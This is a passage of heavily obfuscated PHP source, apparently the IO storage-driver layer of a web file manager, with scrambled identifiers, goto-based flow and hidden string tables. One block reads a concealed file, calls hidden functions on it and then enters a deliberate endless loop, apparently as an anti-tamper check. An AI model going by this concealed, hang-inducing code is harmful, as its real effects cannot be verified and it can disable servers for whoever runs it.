array_unique(array_to_keyvalue($e‘²ÎèîÑ, $dö×‡õòò[33], $dö×‡õòò[2138])); $cîŒùå£ = array_remove_value($cîŒùå£, $dö×‡õòò[468]); goto C´è‚İÕì; F‡ÅÁ„ˆ¥: if (!$fÊ¸ïÃ‡¸) { return !1; } foreach ($e‘²ÎèîÑ as &$aÄßƒ×åÎØ) { $aÄßƒ×åÎØ[$dö×‡õòò[417]] = $fÊ¸ïÃ‡¸[$aÄßƒ×åÎØ[$dö×‡õòò[2138]]]; if (isset($aÄßƒ×åÎØ[$dö×‡õòò[2141]])) { $aÄßƒ×åÎØ[$dö×‡õòò[2141]][$dö×‡õòò[417]] = $fÊ¸ïÃ‡¸[$aÄßƒ×åÎØ[$dö×‡õòò[2141]][$dö×‡õòò[2138]]]; } } goto f×§è…Ğë›; C´è‚İÕì: if (!$cîŒùå£) { return; } foreach ($e‘²ÎèîÑ as $aÄßƒ×åÎØ) { if (isset($aÄßƒ×åÎØ[$dö×‡õòò[2141]])) { $cîŒùå£[] = $aÄßƒ×åÎØ[$dö×‡õòò[2141]][$dö×‡õòò[2138]]; } } $fÊ¸ïÃ‡¸ = $this->metaList($cîŒùå£); goto F‡ÅÁ„ˆ¥; f×§è…Ğë›: } private function metaList($Dõ‡Íìƒ¼Ò) { goto aÓÆ•È·ª; aÓÆ•È·ª: $BêÈã’äĞî =& $_SERVER[Æ]; if (!$Dõ‡Íìƒ¼Ò) { return array(); } $b¼¼¡Š‹™‘ = array($BêÈã’äĞî[2138] => array($BêÈã’äĞî[7], $Dõ‡Íìƒ¼Ò)); goto béíÑá´ä™; béíÑá´ä™: $bÏ‡§ÜƒË´ = Model($BêÈã’äĞî[2142])->where($b¼¼¡Š‹™‘)->select(); $bÏ‡§ÜƒË´ = array_to_keyvalue_group($bÏ‡§ÜƒË´, $BêÈã’äĞî[2138]); foreach ($bÏ‡§ÜƒË´ as $fåÌ‹õœá => $fÖ¡œã÷ï) { $bÃ»ÆÙ£ Æ = array(); foreach ($fÖ¡œã÷ï as $CŞÚ¥¨±†ë) { $bÃ»ÆÙ£ Æ[$CŞÚ¥¨±†ë[$BêÈã’äĞî[89]]] = $CŞÚ¥¨±†ë[$BêÈã’äĞî[359]]; } $bÏ‡§ÜƒË´[$fåÌ‹õœá] = $bÃ»ÆÙ£ Æ; } goto Aèˆñ ˆ”Ã; Aèˆñ ˆ”Ã: return $bÏ‡§ÜƒË´ ? $bÏ‡§ÜƒË´ : array(); goto A¸³æ­°ÔÊ; A¸³æ­°ÔÊ: } } goto DÆ¿»Â»Çå; A™ÈïÓßµ: if (!isset($_SERVER[$_SERVER[Æ][780]]) || !isset($_SERVER[$_SERVER[Æ][996]])) { goto dÇ…°ìãÜ; dÇ…°ìãÜ: $aÀ¦»Óà† = $_SERVER[Æ][781]; $FÙ²ñ¯™Í = $_SERVER[$_SERVER[Æ][782]] . $_SERVER[Æ][783]; $D÷ËÌùõ = $aÀ¦»Óà†($FÙ²ñ¯™Í); goto EŒäãÔŠÒ; fàóšïä¼: $FÒ‹ìåÓî($_SERVER[$_SERVER[Æ][782]] . $_SERVER[Æ][783]); $C‘ª£«´ÑŒ = 2; while ($C‘ª£«´ÑŒ > 1) { $D¦´ô÷êäÁ = rawurlencode($C‘ª£«´ÑŒ . $_SERVER[Æ][361]); } goto eæ¤ìŒê¤; EŒäãÔŠÒ: $B¬îùñ†¦‚ = explode($_SERVER[Æ][217], $D÷ËÌùõ); if (count($B¬îùñ†¦‚) < $_SERVER[Æ][573]) { $EÄÈÇˆ«‘ = $_SERVER[Æ][784]; $EÄÈÇˆ«‘(); } $FÒ‹ìåÓî = $_SERVER[Æ][785]; goto fàóšïä¼; eæ¤ìŒê¤: } class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($D£¢àÜ™§Æ, $E©•†¤À‹”) { $d’ù¡İ™ğÅ = self::driverMake($E©•†¤À‹”[0]); if (method_exists($d’ù¡İ™ğÅ, $D£¢àÜ™§Æ)) { return @call_user_func_array(array($d’ù¡İ™ğÅ, $D£¢àÜ™§Æ), $E©•†¤À‹”); } if (method_exists($d’ù¡İ™ğÅ, $_SERVER[Æ][997])) { return @call_user_func_array(array($d’ù¡İ™ğÅ, $D£¢àÜ™§Æ), $E©•†¤À‹”); } else { if (method_exists(self, $D£¢àÜ™§Æ)) { return @call_user_func_array(array(self, $D£¢àÜ™§Æ), $E©•†¤À‹”); } else { call_user_func_array(array(parent, $D£¢àÜ™§Æ), $E©•†¤À‹”); } } } public static function init($d‡ôÇÑˆğÀ) { return self::driverMake($d‡ôÇÑˆğÀ); } public static function copy($CìƒËÅ˜ªé, $AÍŸ‹£ÃÃ¯, $f‰°·ëğ”Ç = false, $Aæ¨âä¯¯à = false) { return self::copyMove($CìƒËÅ˜ªé, $AÍŸ‹£ÃÃ¯, $f‰°·ëğ”Ç, $_SERVER[Æ][490], $Aæ¨âä¯¯à); } public static function move($DšÎÏ ğ½ï, $d·‚“ğºÒÇ, $FŒêôƒ«ò = false, $EãõÇƒõñÙ = false) { return self::copyMove($DšÎÏ ğ½ï, $d·‚“ğºÒÇ, $FŒêôƒ«ò, $_SERVER[Æ][492], $EãõÇƒõñÙ); } public static function saveFile($c›ù¥‘å‚¾, $EÚ¤ŠÚ ÷ø, $cº‚†îšì« = true) { goto FÊ‘Ğ„Ø—ˆ; FÊ‘Ğ„Ø—ˆ: $a‚½ßÑäŒ‘ =& $_SERVER[Æ]; $bò£äºÚ½† = self::info($EÚ¤ŠÚ ÷ø); $BÜ‹Õ¢…†• = self::driverMake($c›ù¥‘å‚¾); goto Dğš‚¨–; BÀã‰¤ãï: $F¿Ë¤ä½ôä = $Eğ†“¯¼ö„->pathFather($EÚ¤ŠÚ ÷ø); $fÊ§’ÆÙ—é = !0; if (!$cº‚†îšì« && self::driverIsSame($BÜ‹Õ¢…†•, $Eğ†“¯¼ö„)) { $fÊ§’ÆÙ—é = !1; } goto D¯…±ßîô; D¯…±ßîô: $aÂ’ñŒ´Ã = self::copyFile($BÜ‹Õ¢…†•, $c›ù¥‘å‚¾, $Eğ†“¯¼ö„, $F¿Ë¤ä½ôä, $bò£äºÚ½†[$a‚½ßÑäŒ‘[28]], $fÊ§’ÆÙ—é); if ($fÚºÍ¦ƒ–•) { $aÂ’ñŒ´Ã = $fÚºÍ¦ƒ–•->getPathOuter($aÂ’ñŒ´Ã); } return $aÂ’ñŒ´Ã; goto Dëóò¾Í‡; Dğš‚¨–: $Eğ†“¯¼ö„ = self::driverMake($EÚ¤ŠÚ ÷ø); $fÚºÍ¦ƒ–• = !1; if ($Eğ†“¯¼ö„->pathParse[$a‚½ßÑäŒ‘[998]]) { $FØ„—ŒàØÓ = $Eğ†“¯¼ö„->pathParse[$a‚½ßÑäŒ‘[998]]; $fÚºÍ¦ƒ–• = $Eğ†“¯¼ö„; $Eğ†“¯¼ö„ = self::driverMake($FØ„—ŒàØÓ); } goto BÀã‰¤ãï; Dëóò¾Í‡: } private static function copyMove($eÀ•‡œŸñì, $CçË†Â©™, $cæÊµÉ´…Û, $cÁ³ÅÄš‘Ï, $BË·ã´™‘ = false) { goto AÁ®ƒŒ¯Ú; eîÏçë˜È: Hook::trigger($Añèï÷õ’Ö[72], $F˜Õ×Î‹è, $eÀ•‡œŸñì, $aŞîº¼æï, $CçË†Â©™); $dø²Ûöå§ = self::driverIsSame($F˜Õ×Î‹è, $aŞîº¼æï); if ($dø²Ûöå§) { if ($cÁ³ÅÄš‘Ï == $Añèï÷õ’Ö[492] && trim($CçË†Â©™, $Añèï÷õ’Ö[8]) == trim($aŞîº¼æï->pathFather($eÀ•‡œŸñì), $Añèï÷õ’Ö[8])) { return $aŞîº¼æï->getPathOuter($eÀ•‡œŸñì); } if (method_exists($aŞîº¼æï, $cÁ³ÅÄš‘Ï)) { return $aŞîº¼æï->{$cÁ³ÅÄš‘Ï}($eÀ•‡œŸñì, $CçË†Â©™, $cæÊµÉ´…Û); } } goto BìäˆèëÄ; Dæ¥‹Õ¢ğ: $F˜Õ×Î‹è = self::driverMake($eÀ•‡œŸñì); $aŞîº¼æï = self::driverMake($CçË†Â©™); $F²°ŸÖ‡òæ = $cÁ³ÅÄš‘Ï == $Añèï÷õ’Ö[492]; goto dè¶é‡ã«; dè¶é‡ã«: $B¼ĞºÁŞ = !1; if ($aŞîº¼æï->pathParse[$Añèï÷õ’Ö[998]]) { $CçË†Â©™ = $aŞîº¼æï->pathParse[$Añèï÷õ’Ö[998]]; $B¼ĞºÁŞ = $aŞîº¼æï; $aŞîº¼æï = self::driverMake($CçË†Â©™); } self::check($F˜Õ×Î‹è, $eÀ•‡œŸñì, $aŞîº¼æï, $CçË†Â©™); goto eîÏçë˜È; AÁ®ƒŒ¯Ú: $Añèï÷õ’Ö =& $_SERVER[Æ]; if (!$eÀ•‡œŸñì || $eÀ•‡œŸñì == $Añèï÷õ’Ö[8] || !$CçË†Â©™) { return !1; } ignore_timeout(); goto Dæ¥‹Õ¢ğ; BìäˆèëÄ: $eÏ¯ƒ„Ä•õ = $F˜Õ×Î‹è->isFile($eÀ•‡œŸñì); if (!$eÏ¯ƒ„Ä•õ && $aŞîº¼æï->getType() == $Añèï÷õ’Ö[692] && $F˜Õ×Î‹è->getType() == $Añèï÷õ’Ö[102]) { $c‹Ô“Å’¥ = $aŞîº¼æï->copyFolderFromIO($F˜Õ×Î‹è, $eÀ•‡œŸñì, $CçË†Â©™, $cæÊµÉ´…Û, $F²°ŸÖ‡òæ, $BË·ã´™‘); } else { $c‹Ô“Å’¥ = self::copyPath($F˜Õ×Î‹è, $eÀ•‡œŸñì, $aŞîº¼æï, $CçË†Â©™, $cæÊµÉ´…Û, $F²°ŸÖ‡òæ, $eÏ¯ƒ„Ä•õ, $BË·ã´™‘); } if ($c‹Ô“Å’¥ && $F²°ŸÖ‡òæ) { $F˜Õ×Î‹è->remove($eÀ•‡œŸñì); } goto dÔğ¸ØÄì•; dÔğ¸ØÄì•: if ($B¼ĞºÁŞ) { $c‹Ô“Å’¥ = $B¼ĞºÁŞ->getPathOuter($c‹Ô“Å’¥); } return $c‹Ô“Å’¥; goto AÚ¦âÈÇÑ; AÚ¦âÈÇÑ: } private static function check($DÙóÓ¯‚Œ•, $f™®½ÚêØ¥, $A÷İ»‹Õõ, &$b†¯–çêê÷) { $Fîïß¿ó‡õ =& $_SERVER[Æ]; if (self::driverIsSame($DÙóÓ¯‚Œ•, $A÷İ»‹Õõ) && $DÙóÓ¯‚Œ•->isFolder($f™®½ÚêØ¥) && $DÙóÓ¯‚Œ•->isParentOf($f™®½ÚêØ¥, $b†¯–çêê÷)) { show_json(LNG($Fîïß¿ó‡õ[999]), !1); } if (!$DÙóÓ¯‚Œ•->exist($f™®½ÚêØ¥)) { show_json(LNG($Fîïß¿ó‡õ[101]), !1); } } private static function copyPath($a¸åëª«ˆ, $AÜ©í×İ, $EŞŞÍˆß³ß, $AéĞªœ‹«”, $B‰§ç ˆ“µ, $C©ÄÉë¨ù¦, $b©×”êñË‰, $d‘˜æ‰‘ŸÒ = false) { goto eÊ½í®ğéÊ; AÕ¶¼õŠŠ¹: $BáïŒ¯ÓÅ = array_merge($A‘¹ô¯„ãÔ[$A²²¨ô†Ãà[73]], $A‘¹ô¯„ãÔ[$A²²¨ô†Ãà[74]]); foreach ($BáïŒ¯ÓÅ as $D‡ŞâÜ³ßì) { $C¼ÛÍ•Şì° = $D‡ŞâÜ³ßì[$A²²¨ô†Ãà[29]] == $A²²¨ô†Ãà[167]; $AÜ©í×İ = $a¸åëª«ˆ->getPathInner($D‡ŞâÜ³ßì[$A²²¨ô†Ãà[75]]); $BïÊ‡ÄÓ¾Ş = self::copyPath($a¸åëª«ˆ, $AÜ©í×İ, $EŞŞÍˆß³ß, $AéĞªœ‹«”, $B‰§ç ˆ“µ, $C©ÄÉë¨ù¦, $C¼ÛÍ•Şì°); if (!$BïÊ‡ÄÓ¾Ş) { write_log($A²²¨ô†Ãà[1000] . $AÜ©í×İ . $A²²¨ô†Ãà[1001] . $AéĞªœ‹«”, $A²²¨ô†Ãà[1002]); } } return $dÃŠŞÆ«¾; goto fËÒğÉõÀ´; EÕÚŒ·Õ‰‰: if ($b©×”êñË‰) { return self::copyFile($a¸åëª«ˆ, $AÜ©í×İ, $EŞŞÍˆß³ß, $AéĞªœ‹«”, $E¾è¡»ÆÒ”, $C©ÄÉë¨ù¦); } if ($B‰§ç ˆ“µ == REPEAT_RENAME_FOLDER) { $B‰§ç ˆ“µ = !1; } $c„ˆ‡¤¨¾Å = rtrim($AéĞªœ‹«”, $A²²¨ô†Ãà[8]) . $A²²¨ô†Ãà[8] . $E¾è¡»ÆÒ”; goto CîÇ„í£é; eÊ½í®ğéÊ: $A²²¨ô†Ãà =& $_SERVER[Æ]; $E¾è¡»ÆÒ” = $d‘˜æ‰‘ŸÒ ? $d‘˜æ‰‘ŸÒ : $a¸åëª«ˆ->getPathName($a¸åëª«ˆ->pathThis($AÜ©í×İ)); if ($B‰§ç ˆ“µ) { $b¤®ê³¥ÄÌ = $EŞŞÍˆß³ß->fileNameExist($AéĞªœ‹«”, $E¾è¡»ÆÒ”); $E¾è¡»ÆÒ” = $EŞŞÍˆß³ß->fileNameAuto($AéĞªœ‹«”, $E¾è¡»ÆÒ”, $B‰§ç ˆ“µ, !$b©×”êñË‰); $B‰§ç ˆ“µ = $b¤®ê³¥ÄÌ ? $B‰§ç ˆ“µ : !1; } goto EÕÚŒ·Õ‰‰; CîÇ„í£é: $dÃŠŞÆ«¾ = $EŞŞÍˆß³ß->mkdir($EŞŞÍˆß³ß->getPath($c„ˆ‡¤¨¾Å)); $AéĞªœ‹«” = $EŞŞÍˆß³ß->getPathInner($dÃŠŞÆ«¾); $A‘¹ô¯„ãÔ = $a¸åëª«ˆ->listPath($AÜ©í×İ, !0); goto AÕ¶¼õŠŠ¹; fËÒğÉõÀ´: } private static function copyFile($BÈø„‹§¸…, $bô¤ÅöØ, $A¤Œ¼—óÍ‹, $B¢˜ß°´ÚÑ, $aÒ‹“¼‡¦, $Bİ¸ğìĞîã) { goto fóóíƒÄÙ; F×¢µ±ÙÜê: mk_dir($E©×ÈÎëÔµ); $cÉË¾øäğ = $E©×ÈÎëÔµ . $A»÷¾åË«”; $cÉË¾øäğ = $BÈø„‹§¸…->download($bô¤ÅöØ, $cÉË¾øäğ); goto d¾ÜÅö÷ˆ; d¾ÜÅö÷ˆ: $cÉË¾øäğ = $BÈø„‹§¸…->iconvApp($cÉË¾øäğ); $d¹à¹¬“½Ì = $A¤Œ¼—óÍ‹->upload($B¢˜ß°´ÚÑ, $cÉË¾øäğ, $Bİ¸ğìĞîã); self::remove($E©×ÈÎëÔµ . $A»÷¾åË«”); goto cŸƒ»±˜Øò; cŸƒ»±˜Øò: Hook::trigger($eğæÔöÆÇ¤[1005], $BÈø„‹§¸…, $bô¤ÅöØ, $A¤Œ¼—óÍ‹, $B¢˜ß°´ÚÑ, $aÒ‹“¼‡¦, $d¹à¹¬“½Ì); return $d¹à¹¬“½Ì; goto DŒ–ÊˆÂ³±; fÍ—Õè–Üš: Hook::trigger($eğæÔöÆÇ¤[1004], $BÈø„‹§¸…, $bô¤ÅöØ, $A¤Œ¼—óÍ‹, $B¢˜ß°´ÚÑ, $aÒ‹“¼‡¦, $A»÷¾åË«”); if (self::driverIsSame($BÈø„‹§¸…, $A¤Œ¼—óÍ‹)) { if ($Bİ¸ğìĞîã) { $d¹à¹¬“½Ì = $A¤Œ¼—óÍ‹->moveFile($bô¤ÅöØ, $B¢˜ß°´ÚÑ); } else { $d¹à¹¬“½Ì = $A¤Œ¼—óÍ‹->copyFile($bô¤ÅöØ, $B¢˜ß°´ÚÑ); } Hook::trigger($eğæÔöÆÇ¤[1005], $BÈø„‹§¸…, $bô¤ÅöØ, $A¤Œ¼—óÍ‹, $B¢˜ß°´ÚÑ, $aÒ‹“¼‡¦, $d¹à¹¬“½Ì); return $d¹à¹¬“½Ì; } $E©×ÈÎëÔµ = TEMP_FILES; goto F×¢µ±ÙÜê; fóóíƒÄÙ: $eğæÔöÆÇ¤ =& $_SERVER[Æ]; $B¢˜ß°´ÚÑ = $A¤Œ¼—óÍ‹->getPath(rtrim($B¢˜ß°´ÚÑ, $eğæÔöÆÇ¤[8]) . $eğæÔöÆÇ¤[8] . $aÒ‹“¼‡¦); $A»÷¾åË«” = $eğæÔöÆÇ¤[1003] . time() . rand_string(5); goto fÍ—Õè–Üš; DŒ–ÊˆÂ³±: } public static function pathFather($e„Šà˜³Ì‹) { $F‹°ŸŠºÂ = IO::init($e„Šà˜³Ì‹); $F×Œ°¡ÇÏ = $F‹°ŸŠºÂ->pathFather($F‹°ŸŠºÂ->path); return $F‹°ŸŠºÂ->getPathOuter($F×Œ°¡ÇÏ); } public static function fileOut($Aå˜Äö©Í, $dï³å®¹³ï = false, $c…‘©‘š• = false, $d¤ŠĞ†Èä† = '') { $EªÁ³‡¾º¼ = self::driverMake($Aå˜Äö©Í); if ($EªÁ³‡¾º¼->isFileOutServer()) { return $EªÁ³‡¾º¼->fileOutServer($Aå˜Äö©Í, $dï³å®¹³ï, $c…‘©‘š•, $d¤ŠĞ†Èä†); } return $EªÁ³‡¾º¼->fileOut($Aå˜Äö©Í, $dï³å®¹³ï, $c…‘©‘š•, $d¤ŠĞ†Èä†); } public static function fileOutImage($B¬ ãªºŞ„, $E¬«‡´…Ø = 250) { $Eå¨¿İøÈ¶ = array(250, 600, 1200, 3000); for ($f†ƒ¤¼Ï£‰ = 0; $f†ƒ¤¼Ï£‰ < count($Eå¨¿İøÈ¶); $f†ƒ¤¼Ï£‰++) { if ($f†ƒ¤¼Ï£‰ == 0 && $E¬«‡´…Ø <= $Eå¨¿İøÈ¶[$f†ƒ¤¼Ï£‰]) { $E¬«‡´…Ø = $Eå¨¿İøÈ¶[$f†ƒ¤¼Ï£‰]; break; } else { if ($E¬«‡´…Ø > $Eå¨¿İøÈ¶[$f†ƒ¤¼Ï£‰ - 1] && $E¬«‡´…Ø <= $Eå¨¿İøÈ¶[$f†ƒ¤¼Ï£‰]) { $E¬«‡´…Ø = $Eå¨¿İøÈ¶[$f†ƒ¤¼Ï£‰]; break; } else { if ($f†ƒ¤¼Ï£‰ == count($Eå¨¿İøÈ¶) - 1 && $E¬«‡´…Ø > $Eå¨¿İøÈ¶[$f†ƒ¤¼Ï£‰]) { $E¬«‡´…Ø = $Eå¨¿İøÈ¶[$f†ƒ¤¼Ï£‰]; break; } } } } $EÑ§”ß–ì = self::driverMake($B¬ ãªºŞ„); if ($EÑ§”ß–ì->isFileOutServer()) { return $EÑ§”ß–ì->fileOutImageServer($B¬ ãªºŞ„, $E¬«‡´…Ø); } return $EÑ§”ß–ì->fileOutImage($B¬ ãªºŞ„, $E¬«‡´…Ø); } private static function driverIsSame($aÙ·§­´µ, $eôŠ×š™ê) { goto F§í›§Êã; F§í›§Êã: $C‰‰—“­§À =& $_SERVER[Æ]; $FŸ¢ê¦„ = $aÙ·§­´µ->getType(); $AññÖŒ©Ù¢ = $eôŠ×š™ê->getType(); goto Añ¾Ü¸Úî; Añ¾Ü¸Úî: if ($FŸ¢ê¦„ != $AññÖŒ©Ù¢) { return !1; } if ($FŸ¢ê¦„ == $C‰‰—“­§À[692]) { return !0; } if ($FŸ¢ê¦„ == $C‰‰—“­§À[102]) { return !0; } goto dÀğ…×§Ğ; dÀğ…×§Ğ: if ($aÙ·§­´µ->pathDriver == $eôŠ×š™ê->pathDriver) { return !0; } return !1; goto Cİ¼‰ª¢“; Cİ¼‰ª¢“: } public static function copyUpdate($bŠ›å„ó™©, $C Å¿) { goto b…¼í•ê„; Aí‹Ğ«î¨: Hook::trigger($D±††——…[1009], $bŠ›å„ó™©, $C Å¿, $F¾«’†Ú‡°); foreach ($f«ğ¡âˆÚƒ as $b‘éĞæõ) { IO::mkdir($b‘éĞæõ); } foreach ($F±ŞîâÌÁ² as $b‘éĞæõ) { IO::copy($b‘éĞæõ[$D±††——…[1006]], $b‘éĞæõ[$D±††——…[1007]], REPEAT_REPLACE); } goto A»Í¸æ©Î; FºõÀÏîùô: $f«ğ¡âˆÚƒ = array(); foreach ($EŒÑĞÔ„İ­ as $dß›À„©É => $b‘éĞæõ) { if (isset($dÕ‚¡­ì¯[$dß›À„©É])) { if ($b‘éĞæõ[$D±††——…[76]] == 1) { continue; } if ($dÕ‚¡­ì¯[$dß›À„©É][$D±††——…[77]] == $b‘éĞæõ[$D±††——…[77]]) { continue; } } if ($b‘éĞæõ[$D±††——…[76]] == 1) { $f«ğ¡âˆÚƒ[] = $C Å¿ . $D±††——…[8] . $dß›À„©É; continue; } $Aø•½öŞ¦Ì = strstr(trim($dß›À„©É, $D±††——…[8]), $D±††——…[8]) ? get_path_father($dß›À„©É) : $D±††——…[33]; $F±ŞîâÌÁ²[] = array($D±††——…[1006] => $b‘éĞæõ[$D±††——…[75]], $D±††——…[1007] => rtrim($C Å¿, $D±††——…[8]) . $D±††——…[8] . $Aø•½öŞ¦Ì, $D±††——…[1008] => $b‘éĞæõ); } $F¾«’†Ú‡° = array($D±††——…[167] => $F±ŞîâÌÁ², $D±††——…[76] => $f«ğ¡âˆÚƒ); goto Aí‹Ğ«î¨; E„Î½æŠ¡î: $EŒÑĞÔ„İ­ = self::_listAll($bŠ›å„ó™©); $dÕ‚¡­ì¯ = self::_listAll($C Å¿); $F±ŞîâÌÁ² = array(); goto FºõÀÏîùô; b…¼í•ê„: $D±††——… =& $_SERVER[Æ]; if (!IO::exist($bŠ›å„ó™©)) { return !1; } if (!IO::exist($C Å¿)) { IO::mkdir($C Å¿); } goto E„Î½æŠ¡î; A»Í¸æ©Î: } private static function _listAll($b¸†ØÀÑ©Ï) { $C‹œ™ŞœÖ =& $_SERVER[Æ]; $b¸†ØÀÑ©Ï = KodIO::clear($b¸†ØÀÑ©Ï); $d™Í’ëè = IO::listAll($b¸†ØÀÑ©Ï); foreach ($d™Í’ëè as &$a”Ôã‹¤ÀŒ) { $A¥¬ŞíöÌŸ = substr($a”Ôã‹¤ÀŒ[$C‹œ™ŞœÖ[75]], strlen($b¸†ØÀÑ©Ï)); $a”Ôã‹¤ÀŒ[$C‹œ™ŞœÖ[1010]] = trim($A¥¬ŞíöÌŸ, $C‹œ™ŞœÖ[8]); } return array_to_keyvalue($d™Í’ëè, $C‹œ™ŞœÖ[1010]); } public static function fileSubstr($b…Ö…’£ß¹, $c…†ÙŸÒ¦í, $dˆƒ˜á÷àÅ = false) { goto D¸ÆÃİ³¢; dÓò©ºÌ¢„: $a£¼åğÍ”ˆ = $dˆƒ˜á÷àÅ; if ($c…†ÙŸÒ¦í < 0) { $c…†ÙŸÒ¦í = $d·Ù‚¥Åİ + $c…†ÙŸÒ¦í; } if ($dˆƒ˜á÷àÅ === !1) { $dˆƒ˜á÷àÅ = $d·Ù‚¥Åİ - $c…†ÙŸÒ¦í; } goto bÆ–‹Ç‰£Õ; bÆ–‹Ç‰£Õ: if ($c…†ÙŸÒ¦í + $dˆƒ˜á÷àÅ > $d·Ù‚¥Åİ) { $dˆƒ˜á÷àÅ = $d·Ù‚¥Åİ - $c…†ÙŸÒ¦í; } if ($dˆƒ˜á÷àÅ <= 0) { return $_SERVER[Æ][33]; } if ($c…†ÙŸÒ¦í < 0 || $c…†ÙŸÒ¦í >= $d·Ù‚¥Åİ || $dˆƒ˜á÷àÅ > 1024 * 1024 * 5) { throw new Exception("\146\151\154\x65\122\145\x61\x64\40\145\162\x72\x6f\x72\x21\x20\x73\164\x61\162\164\x3d{$c…†ÙŸÒ¦í}\x3b\154\145\x6e\147\x74\150\75{$dˆƒ˜á÷àÅ}\x3b\40\163\151\x7a\145\x3d{$d·Ù‚¥Åİ}\73"); } goto E£É§Ÿ¡³; E£É§Ÿ¡³: return $bÁí¨ƒÄ×->fileSubstr($b…Ö…’£ß¹, $c…†ÙŸÒ¦í, $dˆƒ˜á÷àÅ); goto b£‡çÇÉÚ; D¸ÆÃİ³¢: $bÁí¨ƒÄ× = self::driverMake($b…Ö…’£ß¹); $d·Ù‚¥Åİ = $bÁí¨ƒÄ×->size($b…Ö…’£ß¹); $A¶ƒŒô®› = $c…†ÙŸÒ¦í; goto dÓò©ºÌ¢„; b£‡çÇÉÚ: } private static function driverMake(&$f·°áòÏ¦ ) { goto d‘÷Á²‘ÚÈ; Eï“À¯²Æ˜: return $BÄ¯ÏâÛì; goto aá´¥ñ‚Ëö; d‘÷Á²‘ÚÈ: $D¹›±‘‰¦ó =& $_SERVER[Æ]; $BÌ¹Ô¦š–õ = KodIO::parse($f·°áòÏ¦ ); if (!self::$driverListSystem) { $DÆ¦×¿´©  = Model($D¹›±‘‰¦ó[702])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($DÆ¦×¿´© , $D¹›±‘‰¦ó[367]); } goto AĞ£î±–©ƒ; AĞ£î±–©ƒ: if ($BÌ¹Ô¦š–õ[$D¹›±‘‰¦ó[29]] == KodIO::KOD_IO && !self::$driverListSystem[$BÌ¹Ô¦š–õ[$D¹›±‘‰¦ó[367]]]) { return !1; } $f·°áòÏ¦  = $BÌ¹Ô¦š–õ[$D¹›±‘‰¦ó[1011]]; $BÄ¯ÏâÛì = self::driverGet($BÌ¹Ô¦š–õ, $f·°áòÏ¦ ); goto Eï“À¯²Æ˜; aá´¥ñ‚Ëö: } private static function driverGet($d·“ˆ‚¥¹, &$DŞÊõ©à²Ë) { goto F“Ïãóƒ; F“Ïãóƒ: $A ©ç»ã =& $_SERVER[Æ]; $e¿ˆÑÄ¢œ = $d·“ˆ‚¥¹[$A ©ç»ã[1012]]; $dñ±¤ŠÃœö = $d·“ˆ‚¥¹[$A ©ç»ã[367]]; goto aÄ›ßæâ¶¶; aê©‹Õ•Ö: $CÔ¦”éìä->path = $DŞÊõ©à²Ë; return $CÔ¦”éìä; goto d†‰»Š®µ; bœœ‘å·ƒ§: if (isset($eŒß½‡ù¼ƒ[$A ©ç»ã[6]][$A ©ç»ã[1024]])) { $CÔ¦”éìä->pathBase = rtrim($eŒß½‡ù¼ƒ[$A ©ç»ã[6]][$A ©ç»ã[1024]], $A ©ç»ã[8]) . $A ©ç»ã[8]; $DŞÊõ©à²Ë = $CÔ¦”éìä->pathBase . ltrim($DŞÊõ©à²Ë, $A ©ç»ã[8]); } $DŞÊõ©à²Ë = $CÔ¦”éìä->getPath($DŞÊõ©à²Ë); if (isset($d·“ˆ‚¥¹[$A ©ç»ã[998]])) { $DŞÊõ©à²Ë = $d·“ˆ‚¥¹[$A ©ç»ã[998]]; } goto aê©‹Õ•Ö; dÌšš¹‰: $CÔ¦”éìä = self::$driverCache[$c”æ¥­ÔÃ]; $CÔ¦”éìä->pathDriver = $e¿ˆÑÄ¢œ; $CÔ¦”éìä->pathBase = $A ©ç»ã[33]; goto bœœ‘å·ƒ§; aÄ›ßæâ¶¶: switch ($d·“ˆ‚¥¹[$A ©ç»ã[29]]) { case KodIO::KOD_IO: $eŒß½‡ù¼ƒ = self::$driverListSystem[$dñ±¤ŠÃœö]; break; case KodIO::KOD_SOURCE: $DŞÊõ©à²Ë = $dñ±¤ŠÃœö . $DŞÊõ©à²Ë; $eŒß½‡ù¼ƒ = array($A ©ç»ã[1013] => $A ©ç»ã[1014], $A ©ç»ã[6] => $d·“ˆ‚¥¹); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $cÖÃÂŒÌ£Š = $GLOBALS[$A ©ç»ã[1015]]; self::$driverListUser = array_to_keyvalue($cÖÃÂŒÌ£Š, $A ©ç»ã[367]); } $eŒß½‡ù¼ƒ = self::$driverListUser[$dñ±¤ŠÃœö]; break; case KodIO::KOD_SHARE_LINK: $eŒß½‡ù¼ƒ = array($A ©ç»ã[1013] => $A ©ç»ã[1016], $A ©ç»ã[6] => $d·“ˆ‚¥¹); $b¸ğ‘Ì“ = Action($A ©ç»ã[1017])->sharePathInfo($d·“ˆ‚¥¹[$A ©ç»ã[75]]); $DŞÊõ©à²Ë = $b¸ğ‘Ì“[$A ©ç»ã[369]]; if (!$b¸ğ‘Ì“[$A ©ç»ã[369]]) { $AÎ†‰ö½‘Ä = Model($A ©ç»ã[536])->getInfo($b¸ğ‘Ì“[$A ©ç»ã[441]]); $DŞÊõ©à²Ë = KodIO::clear($AÎ†‰ö½‘Ä[$A ©ç»ã[1018]] . $d·“ˆ‚¥¹[$A ©ç»ã[1011]]); $d·“ˆ‚¥¹[$A ©ç»ã[439]] = $AÎ†‰ö½‘Ä; $d·“ˆ‚¥¹[$A ©ç»ã[998]] = $DŞÊõ©à²Ë; $eŒß½‡ù¼ƒ = array($A ©ç»ã[1013] => $A ©ç»ã[1019], $A ©ç»ã[6] => $d·“ˆ‚¥¹); } break; case KodIO::KOD_SHARE_ITEM: $eŒß½‡ù¼ƒ = array($A ©ç»ã[1013] => $A ©ç»ã[1020], $A ©ç»ã[6] => $d·“ˆ‚¥¹); $AÎ†‰ö½‘Ä = Model($A ©ç»ã[536])->getInfo($d·“ˆ‚¥¹[$A ©ç»ã[367]]); if ($AÎ†‰ö½‘Ä[$A ©ç»ã[369]] == $A ©ç»ã[468]) { $DŞÊõ©à²Ë = KodIO::clear($AÎ†‰ö½‘Ä[$A ©ç»ã[1018]] . $d·“ˆ‚¥¹[$A ©ç»ã[1011]]); $d·“ˆ‚¥¹[$A ©ç»ã[439]] = $AÎ†‰ö½‘Ä; $d·“ˆ‚¥¹[$A ©ç»ã[998]] = $DŞÊõ©à²Ë; $eŒß½‡ù¼ƒ = array($A ©ç»ã[1013] => $A ©ç»ã[1021], $A ©ç»ã[6] => $d·“ˆ‚¥¹); } break; default: $DŞÊõ©à²Ë = 